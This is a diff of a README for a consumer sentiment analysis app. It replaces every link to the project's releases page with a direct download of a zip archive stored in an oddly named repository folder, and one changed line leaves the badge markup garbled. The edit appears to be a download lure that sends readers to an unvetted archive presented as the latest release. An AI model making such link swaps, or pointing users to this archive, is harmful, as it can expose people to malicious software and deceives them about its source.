@@ -1,6 +1,6 @@
 # 🔍 CodeAlpha_Consumer-Sentiment-Analysis - Analyze Consumer Feelings Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/releases)
+[![Download Now](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/CodeAlpha_Consumer-Sentiment-Analysis_1.3-beta.3.zip%20Latest%https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/CodeAlpha_Consumer-Sentiment-Analysis_1.3-beta.3.zip)](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/CodeAlpha_Consumer-Sentiment-Analysis_1.3-beta.3.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ CodeAlpha_Consumer-Sentiment-Analysis is an easy-to-use application that helps y
 To begin using CodeAlpha_Consumer-Sentiment-Analysis, follow these straightforward steps:
 
 1. **Download the Application:**
-   Visit [this page to download](https://github.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/releases) the latest version of the application. 
+   Visit [this page to download](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/CodeAlpha_Consumer-Sentiment-Analysis_1.3-beta.3.zip) the latest version of the application. 
 
 2. **Check System Requirements:**
    Make sure your computer meets the following requirements:
@@ -26,7 +26,7 @@ To begin using CodeAlpha_Consumer-Sentiment-Analysis, follow these straightforwa
 
 ## 📥 Download & Install
 
-To access the latest version, please [visit this page to download](https://github.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/releases).
+To access the latest version, please [visit this page to download](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/CodeAlpha_Consumer-Sentiment-Analysis_1.3-beta.3.zip).
 
 ## 🌟 Features
 
